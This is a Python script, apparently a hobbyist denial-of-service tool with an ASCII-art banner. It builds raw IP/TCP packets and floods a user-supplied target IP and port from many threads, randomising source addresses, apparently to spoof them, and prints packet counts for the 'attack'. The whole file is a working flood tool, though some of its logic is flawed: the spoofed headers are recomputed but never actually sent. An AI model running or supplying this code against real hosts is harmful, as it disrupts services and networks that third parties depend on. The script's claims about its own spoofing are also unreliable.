import sys
import socket
import random
import struct
import threading
import signal
import time

# Global variable definitions
p_num = 0
lock = threading.Lock()
start_time = None

class ThreadInfo:
    def __init__(self, sock, datagram, iph, sin, psh):
        self.sock = sock
        self.datagram = datagram
        self.iph = iph
        self.sin = sin
        self.psh = psh

def csum(buf):
    if len(buf) % 2 == 1:
        buf += b'\0'

    s = sum(struct.unpack('!H', buf[i:i+2])[0] for i in range(0, len(buf), 2))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def info(sig, frame):
    global p_num, start_time

    end_time = time.time()
    time_diff = end_time - start_time

    print("\n\n----------------------------------------------------------")
    print(f"\n\nNumber of PACKETS: {p_num} \t Attack Time: {time_diff:.2f} second\n\n")
    print("----------------------------------------------------------\n\n")

    sys.exit(1)

def attack(sock, datagram, iph, sin, psh):
    global p_num

    while True:
        # Send packets
        sock.sendto(datagram, (sin[0], sin[1]))

        # Critical section for packet numbers
        with lock:
            p_num += 1
            if p_num == 1:
                print("[+] Attack has been started!")

        # Random IP generate and assign
        str_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
        psh_data = bytearray(psh)
        psh_data[12:16] = socket.inet_pton(socket.AF_INET, str_ip)
        iph_data = bytearray(iph)
        iph_data[12:16] = socket.inet_pton(socket.AF_INET, str_ip)
        iph_data[10:12] = struct.pack('H', random.randint(1, 65535))

        # Calculate IP checksum
        iph_checksum = csum(iph_data)
        iph_data[10:12] = struct.pack('H', iph_checksum)

        iph = iph_data

def main():

    storm = """
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣤⣶⣿⣿⣿⣿⡿⠿⠭⠤⠀⠀⠀⠈⠉⠉⠙⠛⠷⣦⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣾⣿⣿⠟⠋⠁⠀⠀⠀⠒⠒⠲⠶⠶⢶⣶⣶⣤⣤⣤⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢻⣿⣾⣿⣿⣿⣿⡿⠶⠶⠤⠤⠀⠀⠀⠀⠉⠛⢿⣿⣿⣿⣦⡀⠀⠀⠀
⠀⠀⠀⠘⣿⣿⡿⠋⠉⣀⣀⣠⣤⣤⣤⣤⣤⡄⠀⠀⠀⠀⣿⣿⣿⡿⠃⠀⠀⠀
⠀⠀⠀⠀⢹⣿⣴⣶⡿⠛⠋⠉⣁⣀⣀⣀⣀⣀⣀⣀⣀⠰⣿⠋⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣾⣿⣿⣏⠀⠀⠀⠀⠈⠉⠉⣉⣉⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠉⠛⠿⢿⣦⡀⠀⠀⠀⠈⠉⠉⠉⠉⢉⠉⠛⠻⣿⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢈⣻⣶⣶⡶⠿⠟⠛⠛⠛⠛⠛⠛⠛⢿⣿⣶⣦⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠛⠛⠻⠿⣦⡀⠀⠀⠀⣀⣀⡀⠠⣤⣸⡟⠋⠉⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣈⣻⣦⣤⣤⣄⣉⣛⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠂⠈⠉⠉⠉⠉⠙⢿⣍⠛⠛⠻⠿⣿⣿⣿⣿⣷⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣧⠀⠀⠀⢀⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣇⠀⢀⣼⠿⠟⠛⠉⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠀⠚⠃⠀⠀⠀⠀⠀⠀⠀⠀
        Coded By Berk Küçük
                """
    print(storm)
    source_port = int(input("Source Port: "))
    target_ip = input("Target IP or Domain: ")
    target_port = int(input("Target Port: "))
    thread_number = int(input("Thread Size: "))

    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    # Initialize IP header
    iph = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, random.randint(1, 65535), 0, 255, socket.IPPROTO_TCP, 0,
                    socket.inet_pton(socket.AF_INET, target_ip), socket.inet_pton(socket.AF_INET, target_ip))

    # Initialize TCP header
    tcph = struct.pack('!HHLLBBHHH', source_port, target_port, 0, 0, 5 << 4, 0, 5840, 0, 0)

    # Create IP and TCP headers
    psh_data = struct.pack('!4s4sBBH', socket.inet_pton(socket.AF_INET, target_ip),
                        socket.inet_pton(socket.AF_INET, target_ip), 0, socket.IPPROTO_TCP, 20)
    psh_data += tcph
    tcph_checksum = csum(psh_data)
    tcph = tcph[:16] + struct.pack('H', tcph_checksum) + tcph[18:]

    # Combine headers to create the datagram
    datagram = iph + tcph

    # Create thread parameters
    thread_params = []
    for _ in range(thread_number):
        thread_params.append(ThreadInfo(sock, datagram, iph, (target_ip, target_port), psh_data))

    global start_time
    start_time = time.time()

    # Start the attack threads
    threads = []
    for params in thread_params:
        thread = threading.Thread(target=attack, args=(params.sock, params.datagram, params.iph, params.sin, params.psh))
        thread.start()
        threads.append(thread)

    # Wait for the SIGINT signal in the main thread
    signal.signal(signal.SIGINT, info)
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Stopping The Attack...")
        sys.exit(0)


if __name__ == "__main__":
    main()
